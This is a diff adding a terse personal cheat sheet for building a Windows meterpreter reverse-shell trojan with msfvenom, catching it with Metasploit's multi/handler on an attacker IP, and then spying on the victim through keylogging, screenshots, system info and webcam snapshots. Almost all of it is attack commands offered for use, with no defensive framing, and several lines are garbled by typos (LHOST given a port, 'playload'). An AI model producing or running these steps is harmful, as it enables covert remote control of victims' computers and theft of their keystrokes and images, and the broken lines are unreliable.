@@ -1,0 +1,26 @@
+1st terminal
+msfdb init
+msfconsole
+in console:
+db_status
+
+2nd terminal
+ifconfig
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<Attcker IP> LHOST=4444 -f exe > trojon.exe
+
+1st terminal
+in console:
+use multi/handler
+set playload /windows/meterpreter/reverse_tcp
+set LHOST <attacker's IP>
+Set LPORT 4444
+exploit
+
+after searching few things.....
+1st terminal:
+
+Keyscan_start
+screenshot
+keyscan_dump
+sysinfo
+webcam_snap
